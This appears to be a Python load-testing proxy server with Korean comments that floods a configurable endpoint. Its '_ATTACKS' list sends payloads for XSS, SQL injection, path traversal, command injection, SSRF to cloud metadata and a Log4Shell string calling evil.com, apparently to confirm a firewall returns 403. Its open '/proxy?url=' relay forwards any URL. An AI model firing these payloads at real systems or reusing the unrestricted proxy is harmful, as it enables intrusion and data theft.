"""
부하 테스트 프록시 서버
- 정적 파일 서빙 (index.html, app.js 등)
- /proxy?url=... 로 요청하면 대신 HTTP 요청 후 응답 전달 (CORS 우회)

사용법:
  python server.py
  브라우저에서 http://localhost:9000 접속
"""
import http.server
import urllib.request
import urllib.error
import urllib.parse
import json
import time
import sys
import os
import threading
import random
import uuid as uuidlib

PORT = 9000

# ---------------------------------------------------------------------------
# 서버사이드 부하 엔진
#   브라우저는 오리진당 동시 연결 ~6개(HTTP/1.1)로 막혀 있어, 브라우저에서
#   fetch 로 아무리 워커를 늘려도 실제 in-flight 요청은 6개뿐이라 노드가 안 늘어난다.
#   그래서 실제 요청은 여기(서버)에서 스레드풀로 직접 쏜다. 브라우저는 시작/정지/집계만.
# ---------------------------------------------------------------------------
_stats_lock = threading.Lock()
_load = {'running': False, 'stats': None, 'stop': None, 'threads': [], 'timer': None}

_ATTACKS = [
    ('GET', '/v1/user?email=%3Cscript%3Ealert(1)%3C/script%3E&requestid=1&uuid=1', None),
    ('GET', "/v1/user?email=' OR 1=1 --&requestid=1&uuid=1", None),
    ('GET', "/v1/user?email=admin'; DROP TABLE user;--&requestid=1&uuid=1", None),
    ('GET', "/v1/product?id=1 UNION SELECT * FROM users--&requestid=1&uuid=1", None),
    ('GET', "/v1/user?email=../../etc/passwd&requestid=1&uuid=1", None),
    ('GET', "/v1/user?email=%24%7Bjndi:ldap://evil.com/a%7D&requestid=1&uuid=1", None),
    ('GET', "/v1/user?email=;cat /etc/passwd&requestid=1&uuid=1", None),
    ('GET', "/v1/product?id=http://169.254.169.254/latest/meta-data&requestid=1&uuid=1", None),
    ('POST', '/v1/user', '{"requestid":"1","uuid":"1","username":"admin\' OR \'1\'=\'1","email":"sqli@test.com"}'),
]
_NOTFOUND = ['/v1/none', '/random', '/api/unknown', '/v2/user', '/admin', '/v1/delete', '/test']


def _blank_stats():
    mk = lambda: {'total': 0, 'success': 0, 'fast': 0, 'sum': 0, 'count': 0}
    return {'user': mk(), 'product': mk(), 'stress': mk(),
            'exception': {'total': 0, 'success': 0},
            'image': {'total': 0, 'success': 0},
            'notfound': {'total': 0, 'success': 0}}


def _fire(method, url, body=None, timeout=5):
    start = time.time()
    try:
        req = urllib.request.Request(url, data=(body.encode() if body else None), method=method)
        if body:
            req.add_header('Content-Type', 'application/json')
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status = resp.status
            resp.read()
    except urllib.error.HTTPError as e:
        status = e.code
    except Exception:
        status = 0
    return status, int((time.time() - start) * 1000)


def _rec_perf(stats, api, status, ms, thr):
    with _stats_lock:
        s = stats[api]
        s['total'] += 1
        s['sum'] += ms
        s['count'] += 1
        if 200 <= status < 300:
            s['success'] += 1
            if ms <= thr:
                s['fast'] += 1


def _rec_count(stats, key, status, ok_status):
    with _stats_lock:
        s = stats[key]
        s['total'] += 1
        if status == ok_status or (ok_status == 2 and 200 <= status < 300):
            s['success'] += 1


def _worker(ep, interval, stresslen, stats, stop):
    while not stop.is_set():
        pick = random.random()
        if pick < 0.25:
            rnd = random.randint(1, 1000)
            u = str(uuidlib.uuid4())
            url = f"{ep}/v1/user?email=dbdump{rnd}%40example.org&requestid={int(time.time()*1000)}&uuid={u}"
            st, ms = _fire('GET', url)
            _rec_perf(stats, 'user', st, ms, 200)
        elif pick < 0.45:
            rnd = random.randint(1, 1000)
            body = json.dumps({'requestid': str(int(time.time()*1000)), 'uuid': str(uuidlib.uuid4()),
                               'id': f'loadtest{rnd}', 'name': f'test{rnd}', 'price': 1000})
            st, ms = _fire('POST', f"{ep}/v1/product", body)
            _rec_perf(stats, 'product', st, ms, 200)
        elif pick < 0.60:
            body = json.dumps({'requestid': str(int(time.time()*1000)), 'uuid': str(uuidlib.uuid4()), 'length': stresslen})
            st, ms = _fire('POST', f"{ep}/v1/stress", body)
            _rec_perf(stats, 'stress', st, ms, 1000)
        elif pick < 0.75:
            m, path, body = random.choice(_ATTACKS)
            st, ms = _fire(m, ep + path, body)
            _rec_count(stats, 'exception', st, 403)
        elif pick < 0.85:
            st, ms = _fire('GET', ep + random.choice(_NOTFOUND))
            _rec_count(stats, 'notfound', st, 404)
        else:
            rnd = random.randint(1, 100)
            st, ms = _fire('GET', f"{ep}/images/product{rnd}.jpg")
            _rec_count(stats, 'image', st, 2)
        if interval > 0:
            time.sleep(interval / 1000.0)


def start_load(cfg):
    stop_load()
    ep = (cfg.get('endpoint') or '').rstrip('/')
    conc = max(1, int(cfg.get('concurrency', 10)))
    interval = int(cfg.get('interval', 0) or 0)
    slen = int(cfg.get('stressLength', 256))
    dur = int(cfg.get('duration', 60))
    stats = _blank_stats()
    stop = threading.Event()
    threads = []
    for _ in range(conc):
        t = threading.Thread(target=_worker, args=(ep, interval, slen, stats, stop), daemon=True)
        t.start()
        threads.append(t)
    timer = threading.Timer(dur, stop_load)
    timer.daemon = True
    timer.start()
    _load.update(running=True, stats=stats, stop=stop, threads=threads, timer=timer)
    return {'ok': True, 'workers': conc}


def stop_load():
    if _load.get('stop'):
        _load['stop'].set()
    if _load.get('timer'):
        try:
            _load['timer'].cancel()
        except Exception:
            pass
    _load['running'] = False
    _load['threads'] = []


def load_snapshot():
    with _stats_lock:
        stats = json.loads(json.dumps(_load['stats'])) if _load['stats'] else None
    return {'running': _load['running'], 'stats': stats}


class ProxyHandler(http.server.SimpleHTTPRequestHandler):
    def _send_json(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path.startswith('/load/stats'):
            self._send_json(load_snapshot())
        elif self.path.startswith('/proxy?'):
            self._handle_proxy('GET')
        else:
            super().do_GET()

    def do_POST(self):
        if self.path.startswith('/load/start'):
            length = int(self.headers.get('Content-Length', 0))
            cfg = json.loads(self.rfile.read(length) or b'{}')
            self._send_json(start_load(cfg))
        elif self.path.startswith('/load/stop'):
            stop_load()
            self._send_json({'ok': True})
        elif self.path.startswith('/proxy?'):
            self._handle_proxy('POST')
        else:
            self.send_error(404)

    def do_PUT(self):
        if self.path.startswith('/proxy?'):
            self._handle_proxy('PUT')
        else:
            self.send_error(404)

    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def _handle_proxy(self, method):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        target_url = params.get('url', [''])[0]

        if not target_url:
            self.send_error(400, 'Missing url parameter')
            return

        # Read body for POST/PUT
        body = None
        content_type = self.headers.get('Content-Type', '')
        if method in ('POST', 'PUT'):
            length = int(self.headers.get('Content-Length', 0))
            if length > 0:
                body = self.rfile.read(length)

        try:
            # URL 에 공백 등 제어문자가 있으면 urllib 이 거부하므로 안전하게 정규화.
            # (브라우저 fetch 는 자동 인코딩하지만 urllib 은 안 함)
            safe_url = urllib.parse.quote(target_url, safe="://?&=@%+.,;!~*'()[]#$")
            req = urllib.request.Request(safe_url, data=body, method=method)
            if content_type:
                req.add_header('Content-Type', content_type)

            start = time.time()
            with urllib.request.urlopen(req, timeout=5) as resp:
                resp_body = resp.read()
                status = resp.status
                elapsed = int((time.time() - start) * 1000)
        except urllib.error.HTTPError as e:
            resp_body = e.read() if e.fp else b''
            status = e.code
            elapsed = int((time.time() - start) * 1000)
        except Exception as e:
            # Timeout or connection error
            result = json.dumps({'error': str(e), 'status': 0, 'ms': 5000}).encode()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.send_header('Content-Length', len(result))
            self.end_headers()
            self.wfile.write(result)
            return

        # Wrap response with metadata
        result = json.dumps({
            'status': status,
            'ms': elapsed,
            'body': resp_body.decode('utf-8', errors='replace')[:2000]
        }).encode()

        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Content-Length', len(result))
        self.end_headers()
        self.wfile.write(result)

    def log_message(self, format, *args):
        # Suppress noisy logs for static files, only show proxy
        if '/proxy?' in str(args[0]):
            sys.stderr.write(f"[proxy] {args[0]}\n")


if __name__ == '__main__':
    os.chdir(os.path.dirname(os.path.abspath(__file__)) or '.')
    server = http.server.ThreadingHTTPServer(('', PORT), ProxyHandler)
    print(f'=== Load Test Proxy Server (threaded) ===')
    print(f'http://localhost:{PORT}')
    print(f'Press Ctrl+C to stop')
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\nStopped.')
